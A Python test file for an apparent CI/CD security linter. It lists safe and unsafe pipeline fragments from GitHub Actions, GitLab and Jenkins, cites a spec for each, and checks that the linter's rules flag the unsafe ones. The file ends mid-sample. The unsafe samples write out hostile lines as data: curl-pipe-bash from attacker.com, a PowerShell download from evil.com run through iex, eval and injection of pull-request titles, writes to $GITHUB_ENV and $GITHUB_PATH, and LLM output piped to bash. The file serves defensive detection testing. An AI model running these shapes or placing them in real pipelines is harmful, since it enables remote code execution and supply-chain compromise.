"""Semantic grammar oracle.

See docs/oracle/REQUIREMENTS.md for the "why", docs/oracle/DESIGN.md for
the "what counts as safe/unsafe", and docs/oracle/ARCHITECTURE.md for the
"how" of this file.

Short version: two dicts of hand-curated YAML / shell / Groovy fragments
whose safe-or-unsafe status is defensible from language semantics alone
(POSIX sh §2.2.2, Bash §3.5.3, Groovy GString spec, etc.).

Two test functions then assert, against the full production rule set:

    * for every SAFE_BY_CONSTRUCTION sample  -> zero rules fire
    * for every UNSAFE_BY_CONSTRUCTION sample -> at least one rule fires

A failure is a signal — not a thing to silence — and the maintainer's
response is either "tighten the rule" or "retract the grammar claim with
a counter-reference."
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

import pytest

import taintly
from taintly.models import Platform, RegexPattern
from taintly.rules.registry import Rule

_PROJECT_ROOT = Path(taintly.__file__).resolve().parent.parent
_DOCS_DIR = _PROJECT_ROOT / "docs" / "oracle"


@dataclass(frozen=True)
class Sample:
    """A grammar sample with its safety claim metadata.

    source         — the workflow-fragment string the oracle scans.
    rationale      — one-line semantic justification (required, non-empty).
    spec_ref       — citation string (POSIX §2.2.2, Bash §3.5.3, OWASP CICD-SEC-6, ...).
    expected_rules — UNSAFE only: rule IDs the author expects to fire. The
                     test asserts the intersection with actually-fired rules
                     is non-empty. Empty frozenset = "any rule firing is fine"
                     (legacy semantics, avoid for new samples).
    xfail_reason   — optional xfail(strict=True) reason. Linkage lives on the
                     sample, not on string identity of source, so reformatting
                     the source text doesn't silently drop the xfail.
    """

    source: str
    rationale: str
    spec_ref: str
    expected_rules: frozenset[str] = field(default_factory=frozenset)
    xfail_reason: str | None = None
    platform: Platform | None = None
    """Optional platform scope. When set, the harness restricts rule
    evaluation to rules with matching Rule.platform. Defaults to
    None (platform-agnostic) so the v1 oracle behaviour is preserved
    for samples whose construct is universal. See
    docs/oracle/EXTENSIONS.md §EXT-A for the curation policy."""

# =============================================================================
# Grammar — SAFE by language semantics
#
# Every sample carries a rationale citing the spec / manual passage that
# establishes safety. Rationale comments are load-bearing; PRs that drop
# them will be rejected per docs/oracle/DESIGN.md §CR-1.
# =============================================================================

SAFE_BY_CONSTRUCTION: dict[str, list[Sample]] = {
    # -------------------------------------------------------------------------
    # POSIX sh §2.2.2 — single quotes suppress ALL expansion
    # (parameter, command, arithmetic). `$VAR` inside `'...'` is literal.
    # -------------------------------------------------------------------------
    "single_quoted_shell_var": [
        Sample(
            source="      - run: echo '$CI_COMMIT_MESSAGE'",
            rationale="Shell never expands $VAR inside single quotes.",
            spec_ref="POSIX sh §2.2.2",
        ),
        Sample(
            source="      - run: echo '$CI_COMMIT_BRANCH'",
            rationale="Same — even with branch-name metacharacters, the $ is literal.",
            spec_ref="POSIX sh §2.2.2",
        ),
        Sample(
            source="      - run: echo '$GITHUB_REF_NAME is safe'",
            rationale="Single-quoted env-var reference inside a shell script; no expansion.",
            spec_ref="POSIX sh §2.2.2",
        ),
        Sample(
            source="      - run: printf '%s\\n' '$CI_MERGE_REQUEST_TITLE'",
            rationale="Multi-token with variables; all literal inside single quotes.",
            spec_ref="POSIX sh §2.2.2",
        ),
    ],

    # -------------------------------------------------------------------------
    # Groovy language spec §"String" — single-quoted literals are
    # java.lang.String, not GString. They do NOT interpolate ${...}.
    # -------------------------------------------------------------------------
    "groovy_single_quoted": [
        Sample(
            source="        sh 'docker build -t ${params.IMAGE_TAG} .'",
            rationale="Jenkins-only: Groovy single quotes = java.lang.String; ${params.X} is literal, not a GString.",
            spec_ref="Groovy lang spec — String",
            platform=Platform.JENKINS,
        ),
        Sample(
            source="        sh 'git checkout ${env.GIT_BRANCH}'",
            rationale="Jenkins-only: env.GIT_BRANCH inside single quotes is literal to Groovy.",
            spec_ref="Groovy lang spec — String",
            platform=Platform.JENKINS,
        ),
        Sample(
            source="        sh 'deploy.sh prod'",
            rationale="Jenkins-only: command has no GString; Groovy doesn't interpolate single-quoted strings.",
            spec_ref="Groovy lang spec — String",
            platform=Platform.JENKINS,
        ),
        Sample(
            source="        sh './gradlew build'",
            rationale="Jenkins-only: legitimate static pipeline-script fragment; no interpolation primitives.",
            spec_ref="Groovy lang spec — String",
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # YAML 1.2 §6.6 — `#` (after optional whitespace) starts a comment
    # that extends to end-of-line. Content is not parsed/executed.
    # -------------------------------------------------------------------------
    "yaml_comment_lines": [
        Sample(
            source="      # - run: echo $CI_COMMIT_MESSAGE",
            rationale="`#` prefix makes it a YAML comment; never reaches the shell.",
            spec_ref="YAML 1.2 §6.6",
        ),
        Sample(
            source="      # - run: curl -s https://attacker.com/install.sh | bash",
            rationale="Commented-out curl|bash; not active code.",
            spec_ref="YAML 1.2 §6.6",
        ),
        Sample(
            source="  # pull_request_target:",
            rationale="Commented pull_request_target trigger — not a real trigger.",
            spec_ref="YAML 1.2 §6.6",
        ),
        Sample(
            source="      # - uses: actions/checkout@v4",
            rationale="Commented uses: line — not an active action reference.",
            spec_ref="YAML 1.2 §6.6",
        ),
    ],

    # -------------------------------------------------------------------------
    # Bash manual §3.6.6 — heredoc with a QUOTED sentinel (<<'EOF',
    # <<"EOF", <<\EOF) suppresses parameter/command/arithmetic expansion
    # on the body. Bytes pass through verbatim.
    # -------------------------------------------------------------------------
    "heredoc_quoted_marker": [
        Sample(
            source=(
                "      - run: |\n"
                "          cat <<'EOF'\n"
                "          $CI_COMMIT_MESSAGE stays literal\n"
                "          EOF"
            ),
            rationale="'EOF' quoted sentinel suppresses parameter expansion on the body.",
            spec_ref="Bash manual §3.6.6",
        ),
        Sample(
            source=(
                "      - run: |\n"
                '          cat <<"EOF"\n'
                "          $CI_COMMIT_MESSAGE stays literal\n"
                "          EOF"
            ),
            rationale='"EOF" (double-quoted) sentinel also suppresses expansion.',
            spec_ref="Bash manual §3.6.6",
        ),
        Sample(
            source=(
                "      - run: |\n"
                "          cat <<\\EOF\n"
                "          $CI_COMMIT_MESSAGE stays literal\n"
                "          EOF"
            ),
            rationale="\\EOF (backslash-quoted) sentinel also suppresses expansion.",
            spec_ref="Bash manual §3.6.6",
        ),
    ],

    # -------------------------------------------------------------------------
    # First-principles — a fragment with no interpolation primitives has
    # nowhere for input to flow. `$`, backtick, `${...}`, `$(...)`, `${{ }}`,
    # `uses:`, `@Grab` all absent.
    # -------------------------------------------------------------------------
    "static_string_literal": [
        Sample(
            source="      - run: echo hello world",
            rationale="No variables, no uses:, no ${{ }} — provably nowhere for input to flow.",
            spec_ref="First principles — no interpolation primitives",
        ),
        Sample(
            source="      - run: make all",
            rationale="Literal command with no user-influence surface.",
            spec_ref="First principles — no interpolation primitives",
        ),
        Sample(
            source="      - run: npm run build",
            rationale="Literal tool invocation, no interpolation.",
            spec_ref="First principles — no interpolation primitives",
        ),
        Sample(
            source="      - run: python /opt/scripts/deploy.py",
            rationale="Static pinned path, no variable references.",
            spec_ref="First principles — no interpolation primitives",
        ),
    ],

    # -------------------------------------------------------------------------
    # PowerShell — Invoke-Expression (iex) is only a curl-pipe-bash shape
    # when the body fetches remote content. A local-file read piped to
    # iex is a dynamic-dispatch pattern with no network surface.
    # -------------------------------------------------------------------------
    "powershell_iex_local_file": [
        Sample(
            source="      - run: pwsh -c 'iex (Get-Content ./local-script.ps1)'",
            rationale="GitHub Actions PowerShell step: Get-Content reads local disk; no remote-fetch API is invoked.",
            spec_ref="PowerShell Invoke-Expression docs — no network surface",
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: pwsh -c 'iex (Type C:\\scripts\\prep.ps1)'",
            rationale="GitHub Actions PowerShell step: Type is a Get-Content alias; reads local path; no remote fetch.",
            spec_ref="PowerShell Invoke-Expression docs — no network surface",
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CI/CD "double-quoted with quoted variable" pattern — shell
    # expands $VAR inside `"..."` but the quoting preserves word boundaries,
    # so the value is passed as a single argument to the consumer. This is
    # the canonical safe shape for user-controlled values in bash.
    # -------------------------------------------------------------------------
    # -------------------------------------------------------------------------
    # Bash §3.1.2.3 — double-quoted "$VAR" expands with parameter expansion but
    # preserves word boundaries AND — critically — echo/printf do NOT re-parse
    # their arguments. The value is emitted verbatim to stdout.
    #
    # Safety here is about the echo/printf consumer, not about the value's
    # safety downstream: deploy.sh "$VAR" is NOT in this category because
    # whether deploy.sh re-parses the argument depends on deploy.sh, not on
    # bash quoting. See RETRACTED_SAMPLES for the dropped deploy.sh sample.
    # -------------------------------------------------------------------------
    "double_quoted_shell_var_passed_to_echo": [
        Sample(
            source='      - run: echo "$CI_COMMIT_MESSAGE"',
            rationale="echo receives ONE argument and does not re-parse metacharacters.",
            spec_ref="Bash manual §3.5.3 + §3.1.2.3; echo(1) — no argument re-parsing",
        ),
        Sample(
            source='      - run: echo "${CI_COMMIT_BRANCH}"',
            rationale="Same as above, with ${} braces — equivalent semantics.",
            spec_ref="Bash manual §3.5.3 + §3.1.2.3",
        ),
        Sample(
            source='      - run: printf "%s\\n" "$CI_COMMIT_MESSAGE"',
            rationale="printf with %s format specifier treats the argument as literal text.",
            spec_ref="Bash manual §3.5.3; printf(1) — %s is literal",
        ),
    ],
}

# =============================================================================
# Grammar — UNSAFE by construction
#
# Each sample has a concrete attack shape. Rationale cites the mechanism.
# =============================================================================

UNSAFE_BY_CONSTRUCTION: dict[str, list[Sample]] = {
    # -------------------------------------------------------------------------
    # Bash §3.5.3 + §3.5.7 — unquoted $VAR undergoes word splitting AND
    # pathname expansion. Attacker-controlled metacharacters (`;`, `|`,
    # `$(...)`, backticks) are re-evaluated by the shell.
    # -------------------------------------------------------------------------
    "unquoted_shell_var_in_sh": [
        Sample(
            source="      - run: echo $CI_COMMIT_MESSAGE",
            rationale="Unquoted CI variable — canonical shell-injection shape.",
            spec_ref="Bash manual §3.5.3 + §3.5.7",
            expected_rules=frozenset({"SEC4-GL-001"}),
        ),
        Sample(
            source="      - run: echo $GITHUB_REF_NAME",
            rationale="GitHub Actions-specific: unquoted auto-populated env var; head-ref name is attacker-chosen.",
            spec_ref="Bash §3.5.3; closes FINDINGS §F-5 via SEC4-GH-018",
            expected_rules=frozenset({"SEC4-GH-018"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: deploy.sh $CI_COMMIT_BRANCH",
            rationale="Unquoted branch name; `;rm -rf /` style payloads execute.",
            spec_ref="Bash manual §3.5.3 + §3.5.7",
            expected_rules=frozenset({"SEC4-GL-001"}),
        ),
        Sample(
            source="      - run: docker build -t app:$CI_COMMIT_TAG .",
            rationale="Unquoted tag name exposes metacharacter substitution.",
            spec_ref="Bash manual §3.5.3 + §3.5.7",
            expected_rules=frozenset({"SEC4-GL-001", "SEC4-GL-003"}),
        ),
    ],

    # -------------------------------------------------------------------------
    # Groovy lang — `"..."` is a GString; `${params.X}` interpolates AT GROOVY
    # PARSE TIME, before `sh` ever runs. Triple-double `"""..."""` is also a
    # GString. Any attacker byte in params.X appears as shell source.
    # -------------------------------------------------------------------------
    "double_quoted_gstring_with_param": [
        Sample(
            source='        sh "git checkout ${params.BRANCH_NAME}"',
            rationale="Jenkins-only: GString interpolation at Groovy parse time becomes shell source.",
            spec_ref="Groovy lang spec — GString",
            expected_rules=frozenset({"SEC4-JK-001"}),
            platform=Platform.JENKINS,
        ),
        Sample(
            source='        sh "git checkout ${env.GIT_BRANCH}"',
            rationale="Jenkins-only: SCM-controlled env var, same GString mechanism.",
            spec_ref="Groovy lang spec — GString",
            expected_rules=frozenset({"SEC4-JK-001", "SEC4-JK-002"}),
            platform=Platform.JENKINS,
        ),
        Sample(
            source='        sh """docker build -t ${params.IMAGE_TAG} ."""',
            rationale="Jenkins-only: triple-double-quoted strings are also GStrings.",
            spec_ref="Groovy lang spec — GString",
            expected_rules=frozenset({"SEC4-JK-001"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # POSIX `eval` / Groovy Eval / PowerShell Invoke-Expression with
    # attacker-influenced string — the argument is parsed AS CODE.
    # -------------------------------------------------------------------------
    "eval_on_dynamic_input": [
        Sample(
            source='      - run: eval "$CI_COMMIT_MESSAGE"',
            rationale="eval re-parses its argument as shell source; the quotes don't help.",
            spec_ref="POSIX eval; closes FINDINGS §F-2 via SEC4-GL-006",
            expected_rules=frozenset({"SEC4-GL-006"}),
        ),
        Sample(
            source="      - run: eval $CI_COMMIT_BRANCH",
            rationale="Unquoted eval on a CI variable is even worse: double re-parsing.",
            spec_ref="POSIX eval",
            expected_rules=frozenset({"SEC4-GL-001", "SEC4-GL-006"}),
        ),
    ],

    # -------------------------------------------------------------------------
    # GitHub Actions — `${{ github.event.pull_request.title }}` and similar
    # attacker-controlled contexts substituted into a `run:` block become
    # shell source. The title/body are arbitrary UTF-8, attacker-chosen.
    # -------------------------------------------------------------------------
    "pr_title_in_run_block": [
        Sample(
            source="      - run: echo ${{ github.event.pull_request.title }}",
            rationale="GitHub Actions-specific: PR title substitutes as shell source at workflow-parse time.",
            spec_ref="GitHub Actions docs — script-injection hardening guide",
            expected_rules=frozenset({"SEC4-GH-004"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: echo ${{ github.event.issue.body }}",
            rationale="GitHub Actions-specific: issue body has the same attacker-controlled property.",
            spec_ref="GitHub Actions docs — script-injection hardening guide",
            expected_rules=frozenset({"SEC4-GH-004"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: echo ${{ github.event.comment.body }}",
            rationale="GitHub Actions-specific: comment body — attacker can trigger via PR comment.",
            spec_ref="GitHub Actions docs — script-injection hardening guide",
            expected_rules=frozenset({"SEC4-GH-004"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: echo ${{ github.head_ref }}",
            rationale="GitHub Actions-specific: head_ref is the attacker-chosen branch name.",
            spec_ref="GitHub Actions docs — script-injection hardening guide",
            expected_rules=frozenset({"SEC4-GH-004"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # Curl-pipe-bash — downloads arbitrary remote content and executes it.
    # No integrity check. A compromised CDN / DNS hijack = code execution.
    # -------------------------------------------------------------------------
    "curl_pipe_bash": [
        Sample(
            source="      - run: curl -sSL https://get.example.com/install.sh | bash",
            rationale="OWASP CICD-SEC-6 canonical shape; server-returned bytes are executed.",
            spec_ref="OWASP CICD-SEC-6",
            expected_rules=frozenset({"SEC6-GH-007", "SEC6-GL-002"}),
        ),
        Sample(
            source="      - run: wget -q -O - https://example.com/setup.sh | sh",
            rationale="wget variant, same remote-fetch-and-execute vector.",
            spec_ref="OWASP CICD-SEC-6",
            expected_rules=frozenset({"SEC6-GH-007", "SEC6-GL-006"}),
        ),
        Sample(
            source="      - run: bash <(curl -s https://example.com/bootstrap.sh)",
            rationale="Process substitution wrapping curl; same semantics as pipe-to-bash.",
            spec_ref="OWASP CICD-SEC-6",
            expected_rules=frozenset({"SEC6-GH-007", "SEC6-GL-006"}),
        ),
        Sample(
            source=(
                "      - run: pwsh -c 'iex (New-Object Net.WebClient)."
                'DownloadString("https://evil.com/p.ps1")\''
            ),
            rationale="GitHub Actions PowerShell step: remote fetch + iex — the real unsafe iex form.",
            spec_ref="OWASP CICD-SEC-6; PowerShell Invoke-Expression docs",
            expected_rules=frozenset({"SEC6-GH-007"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # PowerShell iex on an interpolated string. The reviewer of PR #39
    # correctly flagged that `iex "$($MyVariable)"` is NOT a local-file-read
    # shape — it's eval on a subexpression. If $MyVariable carries attacker-
    # influenced content, this is the PowerShell equivalent of eval "$VAR".
    # Moved here from SAFE/powershell_iex_local_file per audit feedback.
    # -------------------------------------------------------------------------
    "iex_on_interpolated_string": [
        Sample(
            source='      - run: pwsh -c \'iex "$($MyVariable)"\'',
            rationale=(
                "GitHub Actions PowerShell step: iex on a double-quoted "
                "PowerShell string with a subexpression re-parses the "
                "expanded value as code."
            ),
            spec_ref="PowerShell Invoke-Expression docs; closes FINDINGS §F-4 via SEC4-GH-017",
            expected_rules=frozenset({"SEC4-GH-017"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # Docker — `:latest` (or tag-only, no digest) on FROM / image: resolves
    # the mutable tag at build time. Registry compromise = attacker base image.
    # This is SEC3-GH-005 / SEC8-GL-003 territory.
    # -------------------------------------------------------------------------
    "dockerfile_from_latest_image": [
        Sample(
            source=(
                "    services:\n"
                "      db:\n"
                "        image: postgres:latest"
            ),
            rationale="Service container pinned to mutable :latest — registry compromise risk.",
            spec_ref="Docker Hub — tag mutability; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-GL-005", "SEC8-GH-001", "SEC8-GL-001"}),
        ),
        Sample(
            source="    container: node:latest",
            rationale="Job container pinned to mutable :latest tag.",
            spec_ref="Docker Hub — tag mutability; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC8-GH-001"}),
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-2 — workflow granted write-all permissions. The
    # GitHub docs define `write-all` as every scope set to `write`, i.e.
    # the maximum attack surface if the GITHUB_TOKEN is exfiltrated.
    # No language-semantics argument is needed: the string is the
    # configuration, and the attack surface is that configuration's
    # meaning in GitHub's own docs.
    # -------------------------------------------------------------------------
    "workflow_write_all_permissions": [
        Sample(
            source="permissions: write-all",
            rationale="GitHub Actions-specific: `permissions: write-all` grants every scope as write — max token blast radius if exfiltrated.",
            spec_ref="GitHub Actions docs — permissions.write-all; OWASP CICD-SEC-2",
            expected_rules=frozenset({"SEC2-GH-001"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-2 — credential material stored in the pipeline YAML
    # itself rather than a managed secret store. GitLab `DOCKER_AUTH_CONFIG`
    # as a `variables:` value is the canonical example: the JSON blob
    # contains a base64-encoded registry auth token in plain text, visible
    # to every developer with read access to the repo. Jenkins `password(
    # name: ...)` parameters render in the build UI and appear in build
    # parameter logs — functionally identical to a plaintext credential.
    # -------------------------------------------------------------------------
    "pipeline_credential_in_yaml": [
        Sample(
            source=(
                "variables:\n"
                "  DOCKER_AUTH_CONFIG: '{\"auths\": {\"registry.example.com\": {\"auth\": \"abc\"}}}'"
            ),
            rationale="GitLab CI-specific: DOCKER_AUTH_CONFIG embeds a base64-encoded registry credential in the committed YAML — exactly the storage CICD-SEC-2 warns against.",
            spec_ref="GitLab CI docs — DOCKER_AUTH_CONFIG; OWASP CICD-SEC-2",
            expected_rules=frozenset({"SEC2-GL-001"}),
            platform=Platform.GITLAB,
        ),
        Sample(
            source=(
                "parameters {\n"
                "    password(name: 'API_TOKEN', defaultValue: '', description: 'Secret')\n"
                "}"
            ),
            rationale="Jenkins-specific: password() build parameter is stored as a job parameter, visible in build UI and build-trigger logs — not in the managed credential store.",
            spec_ref="Jenkins docs — parameterised builds / credential store; OWASP CICD-SEC-2",
            expected_rules=frozenset({"SEC2-JK-001"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-2 — user-selected credential binding. Jenkins
    # withCredentials(credentialsId: params.X) lets the build triggerer
    # choose which credential to bind at runtime, a confused-deputy
    # primitive: a user with build-trigger access selects a credential
    # their identity alone shouldn't be able to use, and the pipeline
    # obligingly binds it. The credential store's access-control model
    # assumes the credentialsId is a compile-time constant.
    # -------------------------------------------------------------------------
    "jenkins_credential_id_from_params": [
        Sample(
            source=(
                "        withCredentials([string(credentialsId: params.CREDENTIAL_ID, "
                "variable: 'TOK')]) { sh './deploy.sh' }"
            ),
            rationale="Jenkins-specific: credentialsId bound from params.X lets the build triggerer choose the credential — confused-deputy over the credential store's ACL.",
            spec_ref="Jenkins docs — withCredentials / credentialsId; OWASP CICD-SEC-2",
            expected_rules=frozenset({"SEC2-JK-002"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-4 — attacker-controlled value written to $GITHUB_ENV.
    # Sets an environment variable for every subsequent step in the job.
    # Exploited in the Ultralytics supply-chain compromise (Dec 2024) where
    # a PR-title injection laundered through $GITHUB_ENV reached the
    # release step's token handling.
    # -------------------------------------------------------------------------
    "github_env_injection": [
        Sample(
            source='      - run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV',
            rationale="GitHub Actions-specific: PR title is attacker-controlled; writing to $GITHUB_ENV sets a var inherited by every subsequent step.",
            spec_ref="GitHub Actions docs — $GITHUB_ENV; OWASP CICD-SEC-4; Ultralytics incident Dec 2024",
            expected_rules=frozenset({"SEC4-GH-006"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source='      - run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV',
            rationale="GitHub Actions-specific: head_ref is attacker-chosen; $GITHUB_ENV write leaks attacker bytes to later steps.",
            spec_ref="GitHub Actions docs — $GITHUB_ENV; OWASP CICD-SEC-4",
            expected_rules=frozenset({"SEC4-GH-006"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-4 — attacker-controlled value written to $GITHUB_PATH.
    # Direct twin of SEC4-GH-006 (GITHUB_ENV) but a strictly broader attack
    # surface: GITHUB_PATH prepends a search-path entry that every subsequent
    # unqualified command lookup traverses, including tools invoked by later
    # actions (git, node, python, etc.). The attacker does not need to know
    # which specific commands run later — they hijack them all.
    # -------------------------------------------------------------------------
    "github_path_injection": [
        Sample(
            source='      - run: echo "${{ github.event.pull_request.title }}" >> $GITHUB_PATH',
            rationale="GitHub Actions-specific: PR title is attacker-controlled; writing to $GITHUB_PATH prepends a search-path entry for every subsequent step.",
            spec_ref="GitHub Actions docs — $GITHUB_PATH; OWASP CICD-SEC-4",
            expected_rules=frozenset({"SEC4-GH-019"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source='      - run: echo "${{ github.head_ref }}" >> $GITHUB_PATH',
            rationale="GitHub Actions-specific: head_ref is attacker-chosen; $GITHUB_PATH write hijacks command lookup in later steps.",
            spec_ref="GitHub Actions docs — $GITHUB_PATH; OWASP CICD-SEC-4",
            expected_rules=frozenset({"SEC4-GH-019"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # ML / pickle-deserialization RCE — loading a model file with an unsafe
    # flag invokes the Python pickle unpickler, which executes arbitrary code
    # via __reduce__ the moment the file is parsed. The attack shape is a
    # single token on the workflow run: line; the exploit is in the file the
    # workflow downloads. Each of these rules pattern-matches the call shape.
    # -------------------------------------------------------------------------
    "ml_deserialization_unsafe": [
        Sample(
            source='      - run: python -c "AutoModel.from_pretrained(name, trust_remote_code=True)"',
            rationale="GitHub Actions run: step invokes HuggingFace transformers with trust_remote_code=True, which imports and runs Python modules shipped inside the model repo.",
            spec_ref="HuggingFace transformers docs — trust_remote_code; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GH-001"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: python -c \"state = torch.load('checkpoint.pt')\"",
            rationale="GitHub Actions run: step calls torch.load without weights_only=True; PyTorch's pickle.load executes __reduce__ arbitrary code on parse.",
            spec_ref="PyTorch docs — torch.load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GH-003"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - run: python -c \"joblib.load('pipeline.pkl')\"",
            rationale="GitHub Actions run: step calls joblib.load, a pickle-backed loader with no safe flag — same __reduce__ RCE class as torch.load.",
            spec_ref="joblib docs — load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GH-010"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="  script:\n    - python -c \"AutoModel.from_pretrained('x', trust_remote_code=True)\"",
            rationale="GitLab CI script: step invokes HuggingFace transformers with trust_remote_code=True, which imports and runs Python modules shipped inside the model repo.",
            spec_ref="HuggingFace transformers docs — trust_remote_code; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GL-001"}),
            platform=Platform.GITLAB,
        ),
        Sample(
            source="  script:\n    - python -c \"import torch; torch.load('model.pt')\"",
            rationale="GitLab CI script: step calls torch.load without weights_only=True; PyTorch's pickle.load executes __reduce__ arbitrary code on parse.",
            spec_ref="PyTorch docs — torch.load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GL-005"}),
            platform=Platform.GITLAB,
        ),
        Sample(
            source="  script:\n    - python -c \"import joblib; joblib.load('m.pkl')\"",
            rationale="GitLab CI script: step calls joblib.load, a pickle-backed loader with no safe flag — same __reduce__ RCE class as torch.load.",
            spec_ref="joblib docs — load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-GL-003"}),
            platform=Platform.GITLAB,
        ),
        Sample(
            source="sh 'python -c \"AutoModel.from_pretrained(\\'x\\', trust_remote_code=True)\"'",
            rationale="Jenkins sh step invokes HuggingFace transformers with trust_remote_code=True, which imports and runs Python modules shipped inside the model repo.",
            spec_ref="HuggingFace transformers docs — trust_remote_code; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-JK-001"}),
            platform=Platform.JENKINS,
        ),
        Sample(
            source="sh 'python -c \"import torch; torch.load(\\'model.pt\\')\"'",
            rationale="Jenkins sh step calls torch.load without weights_only=True; PyTorch's pickle.load executes __reduce__ arbitrary code on parse.",
            spec_ref="PyTorch docs — torch.load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-JK-002"}),
            platform=Platform.JENKINS,
        ),
        Sample(
            source="sh 'python -c \"import joblib; joblib.load(\\'m.pkl\\')\"'",
            rationale="Jenkins sh step calls joblib.load, a pickle-backed loader with no safe flag — same __reduce__ RCE class as torch.load.",
            spec_ref="joblib docs — load; OWASP CICD-SEC-3",
            expected_rules=frozenset({"AI-JK-004"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # LLM output piped to a shell interpreter. The attacker prompts the
    # model to emit a command; the pipeline executes whatever the model
    # returns. No jailbreak is required — the model is operating normally
    # and the pipeline treats its natural-language output as shell source.
    # -------------------------------------------------------------------------
    "llm_output_piped_to_shell": [
        Sample(
            source="  script:\n    - curl https://api.openai.com/v1/chat/completions -d @in.json | jq -r .content | bash",
            rationale="GitLab CI script: OpenAI API response piped through jq into bash — whatever the model says executes as a shell command.",
            spec_ref="OpenAI API docs; OWASP CICD-SEC-4 (agentic tool output reaching shell)",
            expected_rules=frozenset({"AI-GL-002"}),
            platform=Platform.GITLAB,
        ),
        Sample(
            source="sh 'curl https://api.openai.com/v1/chat/completions -d @in.json | jq -r .content | bash'",
            rationale="Jenkins sh step: OpenAI API response piped through jq into bash — whatever the model says executes as a shell command.",
            spec_ref="OpenAI API docs; OWASP CICD-SEC-4 (agentic tool output reaching shell)",
            expected_rules=frozenset({"AI-JK-003"}),
            platform=Platform.JENKINS,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — supply-chain pinning. The safety claim is that ANY
    # mutable reference to third-party code is a supply-chain compromise
    # path. Registry or repo takeover = attacker-controlled code on next
    # resolution. Closes 3 of 9 SEC3-GH rules from GAPS.md.
    # -------------------------------------------------------------------------
    "github_unpinned_action_ref": [
        Sample(
            source="      - uses: actions/checkout@v4",
            rationale="GitHub Actions-specific: `@v4` is a moving reference; whoever controls the `v4` tag controls the code that runs.",
            spec_ref="OWASP CICD-SEC-3; GitHub Actions docs — pinning actions",
            expected_rules=frozenset({"SEC3-GH-001"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - uses: some-org/deploy@main",
            rationale="GitHub Actions-specific: branch ref; every push to `main` changes what runs.",
            spec_ref="OWASP CICD-SEC-3; GitHub Actions docs — pinning actions",
            expected_rules=frozenset({"SEC3-GH-002"}),
            platform=Platform.GITHUB,
        ),
        Sample(
            source="      - uses: aquasecurity/trivy-action@v0.33.0",
            rationale="GitHub Actions-specific: known-compromised action reference (see the rule's CVE/incident list).",
            spec_ref="OWASP CICD-SEC-3; aquasecurity/trivy-action incident disclosure",
            expected_rules=frozenset({"SEC3-GH-003"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 continued — Docker base image via docker:// without
    # a digest pin. Same mutability risk, different sink (container action).
    # -------------------------------------------------------------------------
    "github_docker_action_no_digest": [
        Sample(
            source="      uses: docker://alpine:3.18",
            rationale="GitHub Actions-specific: `docker://alpine:3.18` is a tag, not a digest; registry compromise swaps the image.",
            spec_ref="OWASP CICD-SEC-3; Docker Hub — content trust / digest pinning",
            expected_rules=frozenset({"SEC3-GH-005"}),
            platform=Platform.GITHUB,
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — dependency-confusion via --extra-index-url. The pip
    # docs are explicit that --extra-index-url causes pip to search the
    # public index first, then fall back — so a name collision on PyPI
    # silently replaces the internal package.
    # -------------------------------------------------------------------------
    "pip_dependency_confusion_extra_index": [
        Sample(
            source="      - run: pip install --extra-index-url https://pypi.internal.corp/ mypackage",
            rationale="Platform-agnostic: pip docs — `--extra-index-url` searches PyPI first; a name collision silently replaces the internal package. `--index-url` is the correct isolating flag.",
            spec_ref="pip docs — --extra-index-url vs --index-url; OWASP CICD-SEC-3",
            expected_rules=frozenset({"SEC3-GH-008"}),
        ),
    ],

    # -------------------------------------------------------------------------
    # OWASP CICD-SEC-3 — GitLab remote include without integrity check.
    # include: remote: <url> fetches whatever the URL returns now, without
    # a sha256 / commit pin. Compromised / taken-over host = arbitrary CI.
    # -------------------------------------------------------------------------
    "gitlab_remote_include_no_integrity": [
        Sample(
            source="include:\n  - remote: 'https://example.com/ci.yml'",
